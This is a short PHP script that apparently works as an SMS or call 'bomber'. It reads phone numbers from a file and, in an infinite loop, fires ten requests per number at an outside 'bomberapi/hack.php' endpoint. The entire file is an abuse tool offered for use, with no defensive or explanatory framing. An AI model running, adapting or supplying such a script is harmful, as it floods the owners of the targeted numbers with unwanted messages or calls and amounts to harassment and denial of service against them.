<?php

$numbers = file("num.txt", FILE_IGNORE_NEW_LINES);
$threads = 10;

while (true) {
    foreach ($numbers as $number) {
        for ($i = 0; $i < $threads; $i++) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://unknownreason.in/bomberapi/hack.php?num=" . $number,
                CURLOPT_RETURNTRANSFER => true,
            ]);
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

?>
